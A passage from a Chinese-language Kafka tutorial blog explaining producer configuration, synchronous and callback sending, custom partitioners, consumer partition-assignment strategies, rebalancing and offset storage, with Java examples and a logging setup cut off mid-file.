infoMap.put(TOPIC_NAME, newPartitions);</span><br><span class="line"></span><br><span class="line">    CreatePartitionsResult createPartitionsResult = adminClient.createPartitions(infoMap);</span><br><span class="line">    createPartitionsResult.all().get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Kafka核心API生产者实战"><a href="#Kafka核心API生产者实战" class="headerlink" title="Kafka核心API生产者实战"></a>Kafka核心API生产者实战</h1><h2 id="生产者发送到Broker分区策略和常见配置"><a href="#生产者发送到Broker分区策略和常见配置" class="headerlink" title="生产者发送到Broker分区策略和常见配置"></a>生产者发送到Broker分区策略和常见配置</h2><p>生产者发送到broker里面的流程是怎样的呢，一个 topic 有多个 partition分区，每个分区又有多个副本</p><ul><li>如果指定Partition ID,则PR被发送至指定Partition (ProducerRecord)</li><li>如果未指定Partition ID,但指定了Key, PR会按照hash(key)发送至对应Partition</li><li>如果未指定Partition ID也没指定Key，PR会按照默认 round-robin轮训模式发送到每个Partition<ul><li>消费者消费partition分区默认是range模式</li></ul></li><li>如果同时指定了Partition ID和Key, PR只会发送到指定的Partition (Key不起作用，代码逻辑决定)</li><li>注意：Partition有多个副本，但只有一个replicationLeader负责该Partition和生产者消费者交互</li></ul><p>生产者到broker发送流程</p><ul><li>Kafka的客户端发送数据到服务器，不是来一条就发一条，会经过内存缓冲区（默认是16KB），通过KafkaProducer发送出去的消息都是先进入到客户端本地的内存缓冲里，然后把很多消息收集到的Batch里面，再一次性发送到Broker上去的，这样性能才可能题高</li></ul><p>生产者常见配置</p><ul><li>官方文档 <a href="http://kafka.apache.org/documentation/#producerconfigs" target="_blank" rel="noopener">http://kafka.apache.org/documentation/#producerconfigs</a></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kafka地址,即broker地址</span></span><br><span class="line"><span class="meta">bootstrap.servers</span>  <span class="string"></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#当producer向leader发送数据时，可以通过request.required.acks参数来设置数据可靠性的级别,分别是0, 1，all。</span></span><br><span class="line"><span class="attr">acks</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#请求失败，生产者会自动重试，指定是0次，如果启用重试，则会有重复消息的可能性</span></span><br><span class="line"><span class="attr">retries</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#每个分区未发送消息总字节大小,单位：字节，超过设置的值就会提交数据到服务端，默认值是16KB</span></span><br><span class="line"><span class="attr">batch.size</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认值就是0，消息是立刻发送的，即便batch.size缓冲空间还没有满，如果想减少请求的数量，可以设置 linger.ms 大于#0，即消息在缓冲区保留的时间，超过设置的值就会被提交到服务端</span></span><br><span class="line"><span class="comment"># 通俗解释是，本该早就发出去的消息被迫至少等待了linger.ms时间，相对于这时间内积累了更多消息，批量发送 减少请求</span></span><br><span class="line"><span class="comment">#如果batch被填满或者linger.ms达到上限，满足其中一个就会被发送</span></span><br><span class="line"><span class="attr">linger.ms</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># buffer.memory的用来约束Kafka Producer能够使用的内存缓冲的大小的，默认值32MB。</span></span><br><span class="line"><span class="comment"># 如果buffer.memory设置的太小，可能导致消息快速的写入内存缓冲里，但Sender线程来不及把消息发送到Kafka服务器</span></span><br><span class="line"><span class="comment"># 会造成内存缓冲很快就被写满，而一旦被写满，就会阻塞用户线程，不让继续往Kafka写消息了</span></span><br><span class="line"><span class="comment"># buffer.memory要大于batch.size，否则会报申请内存不足的错误，不要超过物理内存，根据实际情况调整</span></span><br><span class="line"><span class="attr">buffer.memory</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key的序列化器，将用户提供的 key和value对象ProducerRecord 进行序列化处理，key.serializer必须被设置，即使</span></span><br><span class="line"><span class="comment">#消息中没有指定key，序列化器必须是一个实现org.apache.kafka.common.serialization.Serializer接口的类，将#key序列化成字节数组。</span></span><br><span class="line"><span class="attr">key.serializer</span></span><br><span class="line"><span class="attr">value.serializer</span></span><br></pre></td></tr></table></figure><h2 id="Kafka核心API模块-producer-API实战"><a href="#Kafka核心API模块-producer-API实战" class="headerlink" title="Kafka核心API模块-producer API实战"></a>Kafka核心API模块-producer API实战</h2><p>封装配置属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Properties <span class="title">getProperties</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">        props.put(<span class="string">"bootstrap.servers"</span>, <span class="string">"101.132.252.118:9092"</span>);</span><br><span class="line">        <span class="comment">//props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "101.132.252.118:9092");</span></span><br><span class="line">        <span class="comment">// 当producer向leader发送数据时，可以通过request.required.acks参数来设置数据可靠性的级别,分别是0, 1，all。</span></span><br><span class="line">        props.put(<span class="string">"acks"</span>, <span class="string">"all"</span>);</span><br><span class="line">        <span class="comment">//props.put(ProducerConfig.ACKS_CONFIG, "all");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 请求失败，生产者会自动重试，指定是0次，如果启用重试，则会有重复消息的可能性</span></span><br><span class="line">        props.put(<span class="string">"retries"</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//props.put(ProducerConfig.RETRIES_CONFIG, 0);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生产者缓存每个分区未发送的消息,缓存的大小是通过 batch.size 配置指定的，默认值是16KB</span></span><br><span class="line">        props.put(<span class="string">"batch.size"</span>, <span class="number">16384</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 默认值就是0，消息是立刻发送的，即便batch.size缓冲空间还没有满</span></span><br><span class="line"><span class="comment">         * 如果想减少请求的数量，可以设置 linger.ms 大于0，即消息在缓冲区保留的时间，超过设置的值就会被提交到服务端</span></span><br><span class="line"><span class="comment">         * 通俗解释是，本该早就发出去的消息被迫至少等待了linger.ms时间，相对于这时间内积累了更多消息，批量发送减少请求</span></span><br><span class="line"><span class="comment">         * 如果batch被填满或者linger.ms达到上限，满足其中一个就会被发送</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        props.put(<span class="string">"linger.ms"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * buffer.memory的用来约束Kafka Producer能够使用的内存缓冲的大小的，默认值32MB。</span></span><br><span class="line"><span class="comment">         * 如果buffer.memory设置的太小，可能导致消息快速的写入内存缓冲里，但Sender线程来不及把消息发送到Kafka服务器</span></span><br><span class="line"><span class="comment">         * 会造成内存缓冲很快就被写满，而一旦被写满，就会阻塞用户线程，不让继续往Kafka写消息了</span></span><br><span class="line"><span class="comment">         * buffer.memory要大于batch.size，否则会报申请内存不#足的错误，不要超过物理内存，根据实际情况调整</span></span><br><span class="line"><span class="comment">         * 需要结合实际业务情况压测进行配置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        props.put(<span class="string">"buffer.memory"</span>, <span class="number">33554432</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * key的序列化器，将用户提供的 key和value对象ProducerRecord 进行序列化处理，key.serializer必须被设置，</span></span><br><span class="line"><span class="comment">         * 即使消息中没有指定key，序列化器必须是一个实现org.apache.kafka.common.serialization.Serializer接口的类，</span></span><br><span class="line"><span class="comment">         * 将key序列化成字节数组。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        props.put(<span class="string">"key.serializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringSerializer"</span>);</span><br><span class="line">        props.put(<span class="string">"value.serializer"</span>,<span class="string">"org.apache.kafka.common.serialization.StringSerializer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> props;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>生产者投递消息API实战（同步发送）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * send()方法是异步的，添加消息到缓冲区等待发送，并立即返回</span></span><br><span class="line"><span class="comment">     * 生产者将单个的消息批量在一起发送来提高效率,即 batch.size和linger.ms结合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 实现同步发送：一条消息发送之后，会阻塞当前线程，直至返回 ack</span></span><br><span class="line"><span class="comment">     * 发送消息后返回的一个 Future 对象，调用get即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 消息发送主要是两个线程：一个是Main用户主线程，一个是Sender线程</span></span><br><span class="line"><span class="comment">     *  1)main线程发送消息到RecordAccumulator即返回</span></span><br><span class="line"><span class="comment">     *  2)sender线程从RecordAccumulator拉取信息发送到broker</span></span><br><span class="line"><span class="comment">     *  3)batch.size和linger.ms两个参数可以影响 sender 线程发送次数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSend</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    Properties props = getProperties();</span><br><span class="line">    Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(props);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">        Future&lt;RecordMetadata&gt;  future = producer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"my-topic"</span>, <span class="string">"xdclass-key"</span>+i, <span class="string">"xdclass-value"</span>+i));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RecordMetadata recordMetadata = future.get();<span class="comment">//不关心是否发送成功，则不需要这行</span></span><br><span class="line">            System.out.println(<span class="string">"发送状态："</span>+recordMetadata.toString());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(i+<span class="string">"发送："</span>+LocalDateTime.now().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    producer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="【面试】-ProducerRecord介绍和key的作用"><a href="#【面试】-ProducerRecord介绍和key的作用" class="headerlink" title="【面试】 ProducerRecord介绍和key的作用"></a>【面试】 ProducerRecord介绍和key的作用</h2><p>ProducerRecord（简称PR）：发送给Kafka Broker的key/value 值对, 封装基础数据信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- Topic （名字）</span><br><span class="line">-- PartitionID (可选)</span><br><span class="line">-- Key(可选)</span><br><span class="line">-- Value</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613162107.png" alt="image-20210613162104977"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613162119.png" alt="image-20210613162116729"></p><p>key默认是null，大多数应用程序会用到key</p><ul><li>如果key为空，kafka使用默认的partitioner，使用RoundRobin算法将消息均衡地分布在各个partition上</li><li>如果key不为空，kafka使用自己实现的hash方法对key进行散列，决定消息该被写到Topic的哪个partition，拥有相同key的消息会被写到同一个partition，实现顺序消息</li></ul><h2 id="Kafka核心API模块-producerAPI回调函数实战"><a href="#Kafka核心API模块-producerAPI回调函数实战" class="headerlink" title="Kafka核心API模块-producerAPI回调函数实战"></a>Kafka核心API模块-producerAPI回调函数实战</h2><ul><li>生产者发送消息是异步调用，怎么知道是否有异常？<ul><li>发送消息配置回调函数即可， 该回调方法会在 Producer 收到 ack 时被调用，为异步调用</li><li>回调函数有两个参数 RecordMetadata 和 Exception，如果 Exception 是 null，则消息发送成功，否则失败</li></ul></li><li>异步发送配置回调函数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendWithCallback</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Properties props = getProperties();</span><br><span class="line">    Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(props);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">        producer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"my-topic"</span>, <span class="string">"xdclass-key"</span> + i, <span class="string">"xdclass-value"</span> + i), <span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompletion</span><span class="params">(RecordMetadata metadata, Exception exception)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (exception == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"发送状态："</span>+metadata.toString());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    exception.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(i+<span class="string">"发送："</span>+LocalDateTime.now().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    producer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="producer生产者发送指定分区实战"><a href="#producer生产者发送指定分区实战" class="headerlink" title="producer生产者发送指定分区实战"></a>producer生产者发送指定分区实战</h2><p>创建topic，配置5个分区，1个副本</p><p>发送代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendWithCallbackAndPartition</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Properties props = getProperties();</span><br><span class="line">    Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(props);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">        producer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"my-topic"</span>,i, <span class="string">"xdclass-key"</span> + i, <span class="string">"xdclass-value"</span> + i), <span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompletion</span><span class="params">(RecordMetadata metadata, Exception exception)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (exception == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"发送状态："</span>+metadata.toString());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    exception.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(i+<span class="string">"发送："</span>+LocalDateTime.now().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    producer.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kafka生产者自定义partition分区规则实战"><a href="#Kafka生产者自定义partition分区规则实战" class="headerlink" title="Kafka生产者自定义partition分区规则实战"></a>Kafka生产者自定义partition分区规则实战</h2><p>源码解读默认分区器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.internals.DefaultPartitioner</span><br></pre></td></tr></table></figure><p>自定义分区规则</p><ul><li>创建类，实现Partitioner接口，重写方法</li><li>配置 partitioner.class 指定类即可</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XdclassPartitioner</span> <span class="keyword">implements</span> <span class="title">Partitioner</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(String topic, Object key, <span class="keyword">byte</span>[] keyBytes, Object value, <span class="keyword">byte</span>[] valueBytes, Cluster cluster)</span> </span>&#123;</span><br><span class="line">        List&lt;PartitionInfo&gt; partitions = cluster.partitionsForTopic(topic);</span><br><span class="line">        <span class="keyword">int</span> numPartitions = partitions.size();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回编号为0的分区</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"xdclass"</span>.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//使用hash值取模，确定分区(默认的也是这个方式)</span></span><br><span class="line">        <span class="keyword">return</span> Utils.toPositive(Utils.murmur2(keyBytes)) % numPartitions;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSend</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Properties props = getProperties();</span><br><span class="line">    <span class="comment">//自定义partition分区规则</span></span><br><span class="line">    props.put(<span class="string">"partitioner.class"</span>, <span class="string">"net.xdclass.xdclassredis.XdclassPartitioner"</span>);</span><br><span class="line">    Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(props);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">        Future&lt;RecordMetadata&gt;  future = producer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(TOPIC_NAME, <span class="string">"xdclass"</span>, <span class="string">"xdclass-value"</span>+i));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RecordMetadata recordMetadata = future.get();</span><br><span class="line">            System.out.println(<span class="string">"发送状态："</span>+recordMetadata.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(i+<span class="string">"发送："</span>+LocalDateTime.now().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    producer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Kafka核心API消费者模块实战"><a href="#Kafka核心API消费者模块实战" class="headerlink" title="Kafka核心API消费者模块实战"></a>Kafka核心API消费者模块实战</h1><h2 id="【面试】Consumer消费者机制和分区策略"><a href="#【面试】Consumer消费者机制和分区策略" class="headerlink" title="【面试】Consumer消费者机制和分区策略"></a>【面试】Consumer消费者机制和分区策略</h2><p>消费者根据什么模式从broker获取数据的？</p><p>为什么是pull模式，而不是broker主动push？</p><ul><li>消费者采用 pull 拉取方式，从broker的partition获取数据</li><li>pull 模式则可以根据 consumer 的消费能力进行自己调整，不同的消费者性能不一样<ul><li>如果broker没有数据，consumer可以配置 timeout 时间，阻塞等待一段时间之后再返回</li></ul></li><li>如果是broker主动push，优点是可以快速处理消息，但是容易造成消费者处理不过来，消息堆积和延迟。</li></ul><p>消费者从哪个分区进行消费？</p><ul><li>一个 topic 有多个 partition，一个消费者组里面有多个消费者，那是怎么分配?<ul><li>一个主题topic可以有多个消费者，因为里面有多个partition分区 ( leader分区)</li><li>一个partition leader可以由一个消费者组中的一个消费者进行消费</li><li>一个 topic 有多个 partition，所以有多个partition leader，给多个消费者消费，那分配策略如何？</li></ul></li></ul><p>消费者从哪个分区进行消费？两个策略</p><ul><li>顶层接口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.consumer.internals.AbstractPartitionAssignor</span><br></pre></td></tr></table></figure><p>策略一：round-robin （<strong>RoundRobinAssignor</strong>非默认策略）轮训</p><ul><li>【按照消费者组】进行轮训分配，同个消费者组监听不同主题也一样，是把所有的 partition 和所有的 consumer 都列出来， 所以消费者组里面订阅的主题是一样的才行，主题不一样则会出现分配不均问题，例如7个分区，同组内2个消费者</li><li>topic-p0/topic-p1/topic-p2/topic-p3/topic-p4/topic-p5/topic-p6</li><li>c-1: topic-p0/topic-p2/topic-p4/topic-p6</li><li>c-2:topic-p1/topic-p3/topic-p5</li><li>弊端<ul><li>如果同一消费者组内，所订阅的消息是不相同的，在执行分区分配的时候不是轮询分配，可能会导致分区分配的不均匀</li><li>有3个消费者C0、C1和C2，他们共订阅了 3 个主题：t0、t1 和 t2</li><li>t0有1个分区(p0)，t1有2个分区(p0、p1)，t2有3个分区(p0、p1、p2))</li><li>消费者C0订阅的是主题t0，消费者C1订阅的是主题t0和t1，消费者C2订阅的是主题t0、t1和t2</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613163952.png" alt="image-20210613163948757"></p><p>策略二：range （<strong>RangeAssignor</strong>默认策略）范围</p><ul><li>【按照主题】进行分配，如果不平均分配，则第一个消费者会分配比较多分区， 一个消费者监听不同主题也不影响，例如7个分区，同组内2个消费者</li><li>topic-p0/topic-p1/topic-p2/topic-p3/topic-p4/topic-p5//topic-p6</li><li>c-1: topic-p0/topic-p1/topic-p2/topic-p3</li><li>c-2:topic-p4/topic-p5/topic-p6</li><li>弊端<ul><li>只是针对 1 个 topic 而言，c-1多消费一个分区影响不大</li><li>如果有 N 多个 topic，那么针对每个 topic，消费者 C-1 都将多消费 1 个分区，topic越多则消费的分区也越多，则性能有所下降</li></ul></li></ul><h2 id="【面试】Consumer重新分配策略和offset维护机制"><a href="#【面试】Consumer重新分配策略和offset维护机制" class="headerlink" title="【面试】Consumer重新分配策略和offset维护机制"></a>【面试】Consumer重新分配策略和offset维护机制</h2><p>什么是Rebalance操作？</p><ul><li>kafka 怎么均匀地分配某个 topic 下的所有 partition 到各个消费者，从而使得消息的消费速度达到最快，这就是平衡（balance），前面讲了 Range 范围分区 和 RoundRobin 轮询分区，也支持自定义分区策略。</li><li>而 rebalance（重平衡）其实就是重新进行 partition 的分配，从而使得 partition 的分配重新达到平衡状态</li></ul><p>面试：例如70个分区，10个消费者，但是先启动一个消费者，后续再启动一个消费者，这个会怎么分配？</p><ul><li>Kafka 会进行一次分区分配操作，即 Kafka 消费者端的 Rebalance 操作 ，下面都会发生rebalance操作<ul><li>当消费者组内的消费者数量发生变化（增加或者减少），就会产生重新分配patition</li><li>分区数量发生变化时(即 topic 的分区数量发生变化时)</li></ul></li></ul><p>面试：当消费者在消费过程突然宕机了，重新恢复后是从哪里消费，会有什么问题？</p><ul><li>消费者会记录offset，故障恢复后从这里继续消费，这个offset记录在哪里？</li><li>记录在zk里面和本地，新版默认将offset保证在kafka的内置topic中，名称是 __consumer_offsets<ul><li>该Topic默认有50个Partition，每个Partition有3个副本，分区数量由参数offset.topic.num.partition配置</li><li>通过groupId的哈希值和该参数取模的方式来确定某个消费者组已消费的offset保存到__consumer_offsets主题的哪个分区中</li><li>由 消费者组名+主题+分区，确定唯一的offset的key，从而获取对应的值</li><li>三元组：<strong>group.id+topic+分区号</strong>，而 value 就是 offset 的值</li></ul></li></ul><h2 id="Consumer配置和Kafka调试日志配置"><a href="#Consumer配置和Kafka调试日志配置" class="headerlink" title="Consumer配置和Kafka调试日志配置"></a>Consumer配置和Kafka调试日志配置</h2><p>springboot关闭kafka调试日志</p><ol><li>yml配置文件修改</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">config:</span> <span class="string">classpath:logback.xml</span></span><br></pre></td></tr></table></figure><ol start="2"><li>logback.xml内容</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"STDOUT"</span> <span 